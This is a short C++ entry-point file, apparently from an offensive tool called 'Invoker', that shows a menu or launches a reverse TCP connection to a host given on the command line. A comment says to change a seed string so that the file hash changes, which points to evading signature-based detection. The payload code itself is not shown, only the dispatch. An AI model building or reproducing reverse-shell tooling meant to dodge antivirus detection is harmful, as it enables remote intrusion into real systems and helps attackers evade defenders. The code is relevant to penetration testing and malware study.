#include ".\invoker_interactive.h"

std::string seed = "3301Kira"; // NOTE: Change the seed to change the file hash.

int main(int argc, char** argv) {
	InvokerInteractive::Title();
	if (argc < 2) {
		InvokerInteractive::Menu();
	}
	else if (argc == 2) {
		InvokerInteractive::ReverseTCP(argv[1]);
	}
	else {
		InvokerInteractive::Usage();
	}
	return 0;
}
